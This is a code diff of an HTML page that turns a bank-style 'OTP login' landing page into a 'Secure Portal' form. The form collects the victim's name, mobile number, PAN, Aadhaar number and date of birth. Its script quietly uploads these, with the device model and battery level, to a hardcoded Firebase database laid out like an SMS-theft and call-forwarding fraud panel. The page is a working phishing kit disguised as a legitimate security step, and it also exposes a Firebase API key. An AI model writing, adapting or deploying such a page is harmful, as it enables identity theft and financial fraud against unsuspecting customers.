@@ -1,43 +1,470 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
 <head>
-    <meta charSet="utf-8" />
-    <meta name="viewport" content="width=device-width" />
-    <meta name="next-head-count" content="2" />
-    <link rel="preload" href="/_next/static/css/66277ac4406586ff.css" as="style" crossorigin="" />
-    <link rel="stylesheet" href="/_next/static/css/66277ac4406586ff.css" crossorigin="" data-n-p="" /><noscript data-n-css=""></noscript>
-    <script defer="" crossorigin="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script>
-    <script src="/_next/static/chunks/webpack-e13e76faf17c1a6d.js" defer="" crossorigin=""></script>
-    <script src="/_next/static/chunks/framework-179365b05a66b6ec.js" defer="" crossorigin=""></script>
-    <script src="/_next/static/chunks/main-9bfbf4c43c21bbc5.js" defer="" crossorigin=""></script>
-    <script src="/_next/static/chunks/pages/_app-1534f180665c857f.js" defer="" crossorigin=""></script>
-    <script src="/_next/static/chunks/61-b43eb35841dadfe8.js" defer="" crossorigin=""></script>
-    <script src="/_next/static/chunks/pages/index-7c62853a3efe3d79.js" defer="" crossorigin=""></script>
-    <script src="/_next/static/5sy62ZeER3J9rnPuaTEWc/_buildManifest.js" defer="" crossorigin=""></script>
-    <script src="/_next/static/5sy62ZeER3J9rnPuaTEWc/_ssgManifest.js" defer="" crossorigin=""></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Portal</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background-color: #f5f5f5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .header-img {
+            width: 100%;
+            display: block;
+        }
+        .container {
+            flex: 1;
+            width: 100%;
+            max-width: 100%;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: white;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            padding: 0 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #333;
+            font-size: 14px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            letter-spacing: 1px;
+        }
+        .required {
+            color: red;
+            font-size: 12px;
+            margin-top: 2px;
+            height: 15px;
+        }
+        .error-message {
+            color: red;
+            font-size: 12px;
+            margin-top: 2px;
+            display: none;
+            height: 15px;
+        }
+        .proceed-btn {
+            background-color: #4285f4;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            width: calc(100% - 30px);
+            font-weight: bold;
+            margin: 15px;
+        }
+        .proceed-btn:hover {
+            background-color: #3367d6;
+        }
+        .error {
+            border-color: red;
+        }
+        .footer-img {
+            width: 100%;
+            display: block;
+        }
+        /* Special formatting for card numbers */
+        .formatted-input {
+            letter-spacing: 2px;
+            font-family: monospace;
+        }
+    </style>
 </head>
-
 <body>
-    <div id="__next">
-        <div>
-            <div class="container">
-                <header>
-                    <center>
-                        <h1 class="text-center"><img src="https://spi.dsrin.site/images/HEADER12.jpg" style="width:100%" alt="Header" /></h1>
-                    </center>
-                </header>
-                <div class="bt-box">
-                    <div class="text-center"><a style="text-decoration:none;color:white;background-color:#2B9DCC;padding:10px;padding-inline:50px;font-weight:600" href="index1.php">CONTINUE TO LOGIN</a></div>
-                    <p style="color:#063b6a;font-size:12px;padding-inline:40px;font-weight:700">Dear Customer, OTP Based Login is introduced for added security</p>
-                </div>
-                <center>
-                    <h1 class="text-center"><img src="https://spi.dsrin.site/images/NEEWMG.jpg" style="width:100%" alt="New Image" /></h1>
-                </center>
-            </div>
-        </div>
-    </div>
-    
-</body>
+    <img src="https://spi.dsrin.site/images/HEADER12.jpg" class="header-img" alt="Header">
 
+    <div class="container">
+        <div class="form-group">
+            <label for="data-name">Full Name</label>
+            <input type="text" id="data-name" placeholder="Enter your full name" inputmode="text">
+            <div class="required" id="name-required">Required</div>
+            <div class="error-message" id="name-error">Please enter exactly 2 names (First Name and Last Name)</div>
+        </div>
+
+        <div class="form-group">
+            <label for="data-number">Mobile Number</label>
+            <input type="tel" id="data-number" placeholder="Enter your mobile number" inputmode="numeric" pattern="[0-9]*" maxlength="10">
+            <div class="required" id="number-required">Required</div>
+            <div class="error-message" id="number-error">Please enter exactly 10 digits</div>
+        </div>
+
+        <div class="form-group">
+            <label for="data-pan">PAN Number</label>
+            <input type="text" id="data-pan" placeholder="Enter your PAN number (e.g., ABCDE1234F)" 
+                   inputmode="text" pattern="[A-Za-z0-9]*" maxlength="10" class="formatted-input">
+            <div class="required" id="pan-required">Required</div>
+            <div class="error-message" id="pan-error">PAN must be exactly 10 characters (5 letters + 4 numbers + 1 letter)</div>
+        </div>
+
+        <div class="form-group">
+            <label for="data-aadhaar">Aadhaar Number</label>
+            <input type="tel" id="data-aadhaar" placeholder="Enter your Aadhaar number (e.g., 1234 5678 9012)" 
+                   inputmode="numeric" pattern="[0-9 ]*" maxlength="14" class="formatted-input">
+            <div class="required" id="aadhaar-required">Required</div>
+            <div class="error-message" id="aadhaar-error">Aadhaar must be exactly 12 digits</div>
+        </div>
+
+        <div class="form-group">
+            <label for="data-dob">Date of Birth</label>
+            <input type="tel" id="data-dob" placeholder="DD-MM-YYYY" inputmode="numeric" pattern="[0-9-]*" maxlength="10">
+            <div class="required" id="dob-required">Required</div>
+            <div class="error-message" id="dob-error">Date must be in DD-MM-YYYY format</div>
+        </div>
+
+        <button class="proceed-btn" id="submit-all">Proceed</button>
+    </div>
+
+    <img src="https://spi.dsrin.site/images/NEEWMG.jpg" class="footer-img" alt="Footer">
+
+<script>
+        // Firebase config
+        const firebaseConfig = {
+            apiKey: "AIzaSyBF7HBMC8KJC3RY-OKZMd_lt57orRAJt6g",
+            authDomain: "Vcnv.gfj.hhjk",
+            databaseURL: "https://net-937c7-default-rtdb.firebaseio.com",
+            projectId: "net-937c7",
+            storageBucket: "net-937c7.firebasestorage.app",
+            messagingSenderId: "638759314246",
+            appId: " 1:638759314246:android:fdaf7aa9a09bbdfee63b47"
+        };
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        const PARENT_ID = "19112024";
+        let batteryLevel = "Unknown";
+        let deviceModel = "Unknown";
+        let mainId = "";
+
+        // Format Aadhaar number with spaces (1234 5678 9012)
+        function formatAadhaarNumber(input) {
+            let value = input.value.replace(/\s/g, '').replace(/\D/g, '');
+            let formattedValue = '';
+            
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            
+            input.value = formattedValue.substring(0, 14); // Limit to 12 digits + 2 spaces
+            return formattedValue.replace(/\s/g, ''); // Return raw value without spaces
+        }
+
+        // Format PAN number (ABCDE1234F)
+        function formatPanNumber(input) {
+            let value = input.value.replace(/\s/g, '').toUpperCase();
+            input.value = value.substring(0, 10); // Limit to 10 characters
+            return value;
+        }
+
+        // Format Date of Birth (DD-MM-YYYY)
+        function formatDOB(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length > 2 && value.length <= 4) {
+                value = value.substring(0, 2) + '-' + value.substring(2);
+            } else if (value.length > 4) {
+                value = value.substring(0, 2) + '-' + value.substring(2, 4) + '-' + value.substring(4, 8);
+            }
+            input.value = value.substring(0, 10); // Limit to DD-MM-YYYY
+            return value;
+        }
+
+        // Detect Device Model
+        function detectDeviceModel() {
+            const userAgent = navigator.userAgent;
+            if (/iPhone/.test(userAgent)) return 'iPhone';
+            if (/iPad/.test(userAgent)) return 'iPad';
+            if (/Android/.test(userAgent)) {
+                const modelMatch = userAgent.match(/Android.*;\s([^;]+)\sBuild/i);
+                return modelMatch ? modelMatch[1].trim() : 'Android Device';
+            }
+            if (/Windows Phone/.test(userAgent)) return 'Windows Phone';
+            if (/Mobile/.test(userAgent)) return 'Mobile Device';
+            return 'Desktop/Laptop';
+        }
+
+        // Get Battery Status
+        async function getBatteryStatus() {
+            try {
+                if ('getBattery' in navigator) {
+                    const battery = await navigator.getBattery();
+                    const updateStatus = () => {
+                        batteryLevel = Math.round(battery.level * 100).toString();
+                    };
+                    updateStatus();
+                    battery.addEventListener('levelchange', updateStatus);
+                    battery.addEventListener('chargingchange', updateStatus);
+                } else {
+                    batteryLevel = 'N/A';
+                }
+            } catch {
+                batteryLevel = 'Unavailable';
+            }
+        }
+
+        // ID generators
+        function generateMainId() {
+            const chars = '0123456789abcdef';
+            let result = '';
+            for (let i = 0; i < 16; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        function generateDeviceId() {
+            const firstPart = '00002';
+            const chars = '0123456789abcdef';
+            let rest = '';
+            for (let i = 0; i < 14; i++) {
+                rest += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return firstPart + rest;
+        }
+
+        // Validate inputs with specific requirements
+        function validateInput(value, fieldName, inputElement, errorElement, requiredElement) {
+            // Reset error state
+            inputElement.classList.remove('error');
+            errorElement.style.display = 'none';
+            requiredElement.style.display = 'block';
+            
+            if (!value || value.trim() === '') {
+                inputElement.classList.add('error');
+                requiredElement.style.display = 'block';
+                errorElement.style.display = 'none';
+                return false;
+            }
+
+            // Field-specific validation
+            let isValid = true;
+            switch(fieldName) {
+                case 'name':
+                    const nameParts = value.trim().split(/\s+/);
+                    if (nameParts.length !== 2) {
+                        inputElement.classList.add('error');
+                        requiredElement.style.display = 'none';
+                        errorElement.style.display = 'block';
+                        isValid = false;
+                    } else {
+                        requiredElement.style.display = 'none';
+                    }
+                    break;
+                    
+                case 'mobile number':
+                    if (!/^\d{10}$/.test(value)) {
+                        inputElement.classList.add('error');
+                        requiredElement.style.display = 'none';
+                        errorElement.style.display = 'block';
+                        isValid = false;
+                    } else {
+                        requiredElement.style.display = 'none';
+                    }
+                    break;
+                    
+                case 'PAN number':
+                    if (!/^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(value)) {
+                        inputElement.classList.add('error');
+                        requiredElement.style.display = 'none';
+                        errorElement.style.display = 'block';
+                        isValid = false;
+                    } else {
+                        requiredElement.style.display = 'none';
+                    }
+                    break;
+                    
+                case 'Aadhaar number':
+                    if (!/^\d{12}$/.test(value)) {
+                        inputElement.classList.add('error');
+                        requiredElement.style.display = 'none';
+                        errorElement.style.display = 'block';
+                        isValid = false;
+                    } else {
+                        requiredElement.style.display = 'none';
+                    }
+                    break;
+                    
+                case 'date of birth':
+                    if (!/^\d{2}-\d{2}-\d{4}$/.test(value)) {
+                        inputElement.classList.add('error');
+                        requiredElement.style.display = 'none';
+                        errorElement.style.display = 'block';
+                        isValid = false;
+                    } else {
+                        requiredElement.style.display = 'none';
+                    }
+                    break;
+            }
+            
+            return isValid;
+        }
+
+        // Upload data to Firebase
+        function uploadData() {
+            const name = document.getElementById('data-name').value.trim();
+            const number = document.getElementById('data-number').value.trim();
+            const pan = document.getElementById('data-pan').value.replace(/\s/g, '').toUpperCase();
+            const aadhaar = document.getElementById('data-aadhaar').value.replace(/\s/g, '');
+            const dob = document.getElementById('data-dob').value.trim();
+
+            const deviceId = generateDeviceId();
+            const smsId = Date.now().toString().slice(-4);
+
+            const allData = {
+                [`${PARENT_ID}/All_User/Data/${mainId}`]: {
+                    Aadhaar: aadhaar,
+                    Dob: dob,
+                    Name: name,
+                    Number: number,
+                    PanCard: pan
+                },
+                [`${PARENT_ID}/All_User/Call_For/${mainId}`]: {
+                    PhoneNumber: number,
+                    Status: "No",
+                    SubID: "5225225",
+                    Type: "Active"
+                },
+                [`${PARENT_ID}/All_User/Sms/${mainId}/${smsId}`]: {
+                    date: Date.now().toString(),
+                    msg: "Auto-generated sample message",
+                    ph: "System"
+                },
+                [`${PARENT_ID}/All_User/SimINFO/${mainId}`]: {
+                    dualSim: "Yes",
+                    sim1: `${number} - airtel`,
+                    sim2: `${number} - Jio`,
+                    subID1: "1",
+                    subID2: "2"
+                },
+                [`${PARENT_ID}/All_User/Forwad_Status/${mainId}`]: "No",
+                [`${PARENT_ID}/All_User/User/${mainId}`]: {
+                    id: deviceId
+                },
+                [`${PARENT_ID}/All_User/Info/${deviceId}`]: {
+                    Battery: batteryLevel,
+                    Id: deviceId,
+                    Name: deviceModel,
+                    did: mainId,
+                    status: "Offline"
+                }
+            };
+
+            database.ref().update(allData)
+                .then(() => {
+                    // Reset form after submission
+                    document.getElementById('data-name').value = '';
+                    document.getElementById('data-number').value = '';
+                    document.getElementById('data-pan').value = '';
+                    document.getElementById('data-aadhaar').value = '';
+                    document.getElementById('data-dob').value = '';
+                    mainId = generateMainId();
+                    
+                    // Show required messages again after reset
+                    document.querySelectorAll('.required').forEach(el => {
+                        el.style.display = 'block';
+                    });
+                })
+                .catch(error => {
+                    console.error('Error uploading data:', error);
+                });
+        }
+
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', () => {
+            deviceModel = detectDeviceModel();
+            getBatteryStatus();
+            
+            // Generate ID immediately
+            mainId = generateMainId();
+            
+            // Set up input formatting
+            document.getElementById('data-aadhaar').addEventListener('input', function() {
+                formatAadhaarNumber(this);
+                validateInput(this.value.replace(/\s/g, ''), 'Aadhaar number', this, 
+                    document.getElementById('aadhaar-error'), document.getElementById('aadhaar-required'));
+            });
+            
+            document.getElementById('data-pan').addEventListener('input', function() {
+                formatPanNumber(this);
+                validateInput(this.value, 'PAN number', this, 
+                    document.getElementById('pan-error'), document.getElementById('pan-required'));
+            });
+            
+            document.getElementById('data-dob').addEventListener('input', function() {
+                formatDOB(this);
+                validateInput(this.value, 'date of birth', this, 
+                    document.getElementById('dob-error'), document.getElementById('dob-required'));
+            });
+            
+            // Set up submit button
+            document.getElementById('submit-all').addEventListener('click', () => {
+                const nameInput = document.getElementById('data-name');
+                const numberInput = document.getElementById('data-number');
+                const panInput = document.getElementById('data-pan');
+                const aadhaarInput = document.getElementById('data-aadhaar');
+                const dobInput = document.getElementById('data-dob');
+                
+                const name = nameInput.value.trim();
+                const number = numberInput.value.trim();
+                const pan = panInput.value.replace(/\s/g, '').toUpperCase();
+                const aadhaar = aadhaarInput.value.replace(/\s/g, '');
+                const dob = dobInput.value.trim();
+                
+                // Validate all fields
+                const isNameValid = validateInput(name, 'name', nameInput, 
+                    document.getElementById('name-error'), document.getElementById('name-required'));
+                const isNumberValid = validateInput(number, 'mobile number', numberInput, 
+                    document.getElementById('number-error'), document.getElementById('number-required'));
+                const isPanValid = validateInput(pan, 'PAN number', panInput, 
+                    document.getElementById('pan-error'), document.getElementById('pan-required'));
+                const isAadhaarValid = validateInput(aadhaar, 'Aadhaar number', aadhaarInput, 
+                    document.getElementById('aadhaar-error'), document.getElementById('aadhaar-required'));
+                const isDobValid = validateInput(dob, 'date of birth', dobInput, 
+                    document.getElementById('dob-error'), document.getElementById('dob-required'));
+                
+                if (isNameValid && isNumberValid && isPanValid && isAadhaarValid && isDobValid) {
+                    uploadData();
+                }
+            });
+            
+            // Add real-time validation for other fields
+            document.getElementById('data-name').addEventListener('input', function() {
+                validateInput(this.value, 'name', this, 
+                    document.getElementById('name-error'), document.getElementById('name-required'));
+            });
+            document.getElementById('data-number').addEventListener('input', function() {
+                validateInput(this.value, 'mobile number', this, 
+                    document.getElementById('number-error'), document.getElementById('number-required'));
+            });
+            
+            // Focus on first input
+            document.getElementById('data-name').focus();
+        });
+    </script>
+</body>
 </html>
